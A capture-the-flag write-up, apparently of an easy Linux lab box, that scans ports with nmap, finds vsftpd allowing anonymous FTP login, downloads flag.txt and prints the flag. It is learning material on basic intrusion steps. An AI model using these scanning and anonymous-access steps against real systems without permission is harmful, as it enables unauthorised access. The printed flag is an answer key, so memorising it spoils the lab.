System: Linux
Difficulty: Very Easy

IP Address: 10.129.101.24

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.101.24 -p- -v
```

Only Port 21/TCP FTP was returned.
```
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.44 seconds
           Raw packets sent: 65907 (2.900MB) | Rcvd: 65564 (2.623MB)
```

FTP Connection is attempted.
```
kali@kali:~$ ftp 10.129.101.24 21
```

More information can be obtained about the service.
```
kali@kali:~$ sudo nmap 10.129.101.24 -p 21 -sC -sV
```

Anonymous Login is allowed with a flag file directly on the share.
```
<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

Default Anonymous Login for FTP is attempted, using both`anonymous` as username and password.
```
<SNIP>
Name (10.129.101.24:kali): anonymous
331 Please specify the password.
Password:
```

The directory is listed and the flag file is downloaded in the attacker system.
```
<SNIP>
ftp> dir
229 Entering Extended Passive Mode (|||60538|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||38802|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |************************************************************************|    32       57.87 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.98 KiB/s)
ftp> exit
221 Goodbye.
```

Flag contents can be read as below.
```
035db21c881520061c53e0536e44f815
```